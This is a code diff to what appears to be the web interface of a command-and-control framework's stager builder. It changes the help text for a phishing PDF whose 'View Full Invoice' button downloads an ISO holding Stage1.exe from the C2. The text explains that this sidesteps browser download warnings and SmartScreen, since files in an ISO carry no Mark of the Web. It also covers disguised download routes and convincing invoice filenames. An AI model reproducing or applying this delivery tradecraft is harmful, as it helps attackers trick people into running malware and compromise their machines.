@@ -3420,10 +3420,10 @@ function renderStager() {
       <span style="font-size:10px;background:rgba(63,185,80,0.15);color:#3fb950;border-radius:10px;padding:2px 8px;font-weight:600">Works in Edge · Chrome · Foxit · Adobe — no dialog</span>
     </div>
     <div style="font-size:11px;color:var(--muted);margin-bottom:10px;line-height:1.6">
-      A <b>100% AV-clean PDF</b> with a visible "View Full Invoice" button. Clicking the button opens
-      a browser download of Stage1.exe from the C2. No <code>/Launch</code>, no scripts, no prompts —
-      the PDF itself is invisible to AV. Used by <b>Operation Spalax</b> and <b>Star Blizzard</b> (MITRE T1204.002).
-      After download, target double-clicks the file (pair with a convincing filename).
+      A <b>100% AV-clean PDF</b> with a visible "View Full Invoice" button. Clicking downloads an <b>ISO</b>
+      (not an EXE) — Edge/Chrome don't show "dangerous file" warnings for disk images.
+      Target mounts ISO → double-clicks the PDF inside → Stage1.exe runs silently with
+      <b>no SmartScreen</b> (files inside an ISO carry no MOTW). Build the ISO in the T1204.002 card above first.
     </div>
     <div style="display:flex;gap:10px;align-items:flex-end;flex-wrap:wrap">
       <div style="display:flex;flex-direction:column;gap:4px">
@@ -3446,11 +3446,11 @@ function renderStager() {
     </div>
     <div style="margin-top:8px;display:flex;gap:8px;align-items:center">
       <label style="font-size:11px;color:var(--muted);white-space:nowrap">URL shown on hover:</label>
-      <input id="lpdf-dlurl" placeholder="leave blank = auto (e.g. /dl/Invoice_Q4-2024_SecureViewer.exe)"
+      <input id="lpdf-dlurl" placeholder="leave blank = auto ISO link (e.g. /dl/iso/Invoice_Q4-2024.iso)"
              style="flex:1;background:var(--bg2);border:1px solid var(--bg3);border-radius:6px;color:var(--text);font-size:11px;padding:5px 8px;outline:none;font-family:monospace">
     </div>
     <div style="font-size:11px;color:var(--muted);margin-top:4px">
-      Default auto-generates <code>/dl/&lt;filename&gt;_SecureViewer.exe</code> — a masked route that serves Stage1.exe under a convincing name. Override with any URL (your own domain, OneDrive link, etc.).
+      Default auto-generates <code>/dl/iso/&lt;filename&gt;.iso</code> — serves the ISO built in the T1204.002 card. Override with any URL (direct EXE, your own domain, etc.).
     </div>
   </div>
 
